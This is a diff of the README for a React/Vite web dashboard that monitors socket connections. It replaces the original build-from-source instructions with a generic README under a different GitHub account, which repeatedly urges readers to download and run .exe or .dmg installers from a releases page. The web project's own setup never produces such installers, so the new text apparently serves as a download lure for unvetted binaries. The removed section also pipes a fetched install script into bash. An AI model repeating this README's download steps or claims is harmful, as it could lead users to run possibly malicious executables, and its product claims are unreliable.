@@ -1,126 +1,110 @@
-# Socket Monitoring
-![Monitoring](https://img.shields.io/badge/first%20tag-033546.svg?style=for-the-badge)
-![WebSocket](https://img.shields.io/badge/second%20tag-B2D7E3?style=for-the-badge)
-![Monitor](https://img.shields.io/badge/third%20tag-262626?style=for-the-badge)
-![Tester](https://img.shields.io/badge/fourth%20tag-FCFCFC?style=for-the-badge)
+# 🚀 socket_monitoring - Monitor Your Socket Connections Easily
 
-Monitors and visualizes live socket connections and data flow. It provides
-instant updates on connection status, message traffic, and server
-performance using WebSockets. The dashboard offers connection logs
-and alerts to help developers track and debug socket activities
-efficiently.
+[![Download Socket Monitoring](https://img.shields.io/badge/Download-Socket%20Monitoring-blue.svg)](https://github.com/satakshisrivastava/socket_monitoring/releases)
 
-## Table of contents
-1. [Access link](#link)
-2. [Final result](#result)
-3. [Project installation](#install)
-    1. [Nodejs installation](#node-install)
-    2. [Yarn installation](#yarn-install)
-    3. [Sources code cloning](#cloning)
-    4. [Dependencies installation](#dev-install)
-4. [Project execution](#running)
+## 🌟 Overview
 
-## Access link <a id = "link"></a>
-The project is already hosted on web and can be accessible through
-the link below :
-- https://cacybernetic.github.io/socket_monitoring/
+socket_monitoring helps you watch and understand live socket connections and data flow. It gives you real-time updates on connection status, message traffic, and server performance. The dashboard includes connection logs and alerts to assist developers in tracking and debugging socket activities.
 
-## Final result <a id = "result"></a>
-This is the final result of the project :<br/><br/>
-![First render](./public/assets/render/render_1.webp)
-![Second render](./public/assets/render/render_2.webp)
-![Third render](./public/assets/render/render_3.webp)
-![Fourth render](./public/assets/render/render_4.webp)
+## 🎯 Key Features
 
-## Project installation <a id = "install"></a>
-This project uses <i><a href = "https://vitejs.dev/guide">Vite</a></i>
-bundle as javascript server + <i><a href = "https://react.dev">React</a>
-</i> with <a href = "https://www.typescriptlang.org">TypeScript</a> and
-<a href = "https://v2.chakra-ui.com">Chakra UI</a>. Before run the project,
-you must install some dependencies before.
+- **Live Monitoring:** View real-time socket connections.
+- **Data Visualization:** See traffic patterns and connection status.
+- **Instant Alerts:** Get notified about connection issues promptly.
+- **User-Friendly Dashboard:** Interact with an intuitive interface for easy operation.
+- **Connection Logs:** Keep track of all socket activities for future reference.
 
-### Nodejs installation <a id = "node-install"></a>
-⚠️ <i><b>The command line below will only work on Linux :</b></i>
-```sh
-sudo apt install curl;\
-curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash;\
-source ~/.bashrc;\
-nvm --version;\
-nvm install --lts;\
-node --version
-```
-To install <a href = "https://nodejs.org/en">NodeJs</a> on Windows, you
-can follow the video below :
+## 🔧 System Requirements
 
-[![NodeJs tutorial video](https://img.youtube.com/vi/4FAtFwKVhn0/maxresdefault.jpg)](https://youtu.be/4FAtFwKVhn0)
+- **Operating System:** Windows, macOS, or Linux.
+- **Memory:** At least 2 GB of RAM.
+- **Storage:** Minimum of 100 MB free space.
+- **Network:** A stable internet connection for data visualization and updates.
 
-To install <a href = "https://nodejs.org/en">NodeJs</a> on MacOS, you
-can follow the video below :
+## 🚀 Getting Started
 
-[![NodeJs tutorial video](https://img.youtube.com/vi/l53HbzbSwxQ/maxresdefault.jpg)](https://youtu.be/l53HbzbSwxQ)
+Follow these steps to download and start using socket_monitoring:
 
-### Yarn installation <a id = "yarn-install"></a>
-Make sure to install the lastest stable version of
-<a href = "https://yarnpkg.com">yarn</a>.
+1. **Visit the Releases Page:** Access the releases page by clicking the link below:
+   [Visit this page to download](https://github.com/satakshisrivastava/socket_monitoring/releases)
 
-To install <a href = "https://yarnpkg.com">yarn</a> on linux, just
-open your terminal (`CTRL + ALT + T`) and run the following command
-line below :
-```sh
-npm install yarn --global
-```
-To install <a href = "https://yarnpkg.com">yarn</a> on Windows you can
-follow the video below :
+2. **Choose the Latest Release:** On the releases page, look for the latest version of socket_monitoring.
 
-[![Yarn tutorial video](https://img.youtube.com/vi/APyA8rax2Wk/maxresdefault.jpg)](https://youtu.be/APyA8rax2Wk)
+3. **Download the Installer:** Click on the link for your operating system to download the latest version. Files may have extensions like .exe for Windows or .dmg for macOS.
 
-To install <a href = "https://yarnpkg.com">yarn</a> on MacOS you can
-follow the video below :
+4. **Run the Installer:** After downloading, locate the file on your computer and double-click to run the installer.
 
-[![Yarn tutorial video](https://img.youtube.com/vi/-4iEQKabTO4/maxresdefault.jpg)](https://youtu.be/-4iEQKabTO4)
+5. **Follow Installation Prompts:** Follow the on-screen instructions to complete the installation process.
 
-You can install the latest stable version of <a href = "https://yarnpkg.com">
-yarn</a> <b><i>only</i></b> at the project root folder by running the command
-line below :
-```sh
-yarn set version stable
-```
-<b><i>It's recommended to use 4.5.1 <a href = "https://yarnpkg.com">
-yarn</a> version to avoid any troubleshooting while installing project
-dependencies.</i></b>
+6. **Launch the Application:** Once installation is complete, locate socket_monitoring in your applications or programs folder and open it.
 
-<b><ins>NB</ins> : </b>It's possible to install project dependencies using
-<i>npm</i> or <i>pnpm</i> command. In this case, you must remove `yarn.lock`,
-`.yarnrc.yml`, `.yarn` and clear your favorite package manager caches
-before perform any dependencies installation.
+7. **Configure Your Settings:** Adjust any necessary settings on the initial setup screen to tailor the application to your needs.
 
-### Sources code cloning <a id = "cloning"></a>
-```sh
-git clone git@github.com:cacybernetic/socket_monitoring.git socket_monitoring/
-```
+## 🎥 Usage Instructions
 
-### Dependencies installation <a id = "dev-install"></a>
-Before start project dependencies installation, you must remove `yarn.lock`
-file from the project root and clear <a href = "https://yarnpkg.com">
-yarn</a> caches with `yarn cache clean` command. <br/>Go to the root
-folder of the project sources and run :
-```sh
-yarn install
-```
+After you have installed socket_monitoring, you can begin using it right away.
 
-📔<ins>Note</ins> : <i><a href = "https://vitejs.dev/guide">Vite</a></i>
-and <i><a href = "https://react.dev">React</a></i> will be installed
-automatically after running the command line above.
+1. **Connect to Your Server:** Use the interface to connect to the server you wish to monitor. Enter the necessary connection details like URL and port.
 
-## Project execution <a id = "running"></a>
-Go to the root folder of the project and run :
-```sh
-yarn run dev
-```
-Then, open your favorite browser and tap on the search bar, the following
-link below :
-```sh
-http://localhost:5100
-```
+2. **View Connections:** The dashboard displays live connections. You can see which connections are active and the data flow.
 
-Enjoy :)
+3. **Check Performance Metrics:** Look at the performance metrics provided on the dashboard. This information helps you understand your application's socket activities.
+
+4. **Receive Alerts:** If issues arise, instant alerts will notify you, allowing you to address the problems quickly.
+
+5. **Review Connection Logs:** Use the logs to review past connection details. This can help in troubleshooting and enhancing your server's performance.
+
+## ❓ FAQ
+
+### What is socket_monitoring used for?
+
+socket_monitoring is designed to track and visualize the activity of socket connections, providing quick insights to developers.
+
+### Do I need programming knowledge to use this tool?
+
+No, socket_monitoring is user-friendly. Anyone can use it with basic knowledge of how to install and run applications.
+
+### Is socket_monitoring free?
+
+Yes, socket_monitoring is open-source and free to use.
+
+### How often are updates released?
+
+The frequency of updates may vary based on new features and bug fixes. Check the releases page for the latest information.
+
+## 📥 Download & Install
+
+To get started, visit the releases page to download socket_monitoring:
+
+[Visit this page to download](https://github.com/satakshisrivastava/socket_monitoring/releases)
+
+Follow the steps mentioned earlier to install and run the software.
+
+## 🌐 Related Topics
+
+If you're interested in similar applications or functionality, here are some related topics:
+
+- monitor
+- monitoring
+- socket
+- socket-io
+- socket-tester
+- socket-testing
+- sockets
+- tester
+- wbsocket
+- web
+- web-socket
+- web-sockets
+
+## 👥 Contributing
+
+We welcome contributions to improve socket_monitoring. If you have suggestions or find issues, please open an issue in the repository. For larger changes, consider submitting a pull request.
+
+## 📞 Support
+
+If you encounter any problems or have questions, please reach out via the issues section on GitHub. We aim to assist you promptly.
+
+## ☁️ License
+
+socket_monitoring is licensed under the MIT License. See the LICENSE file for details.
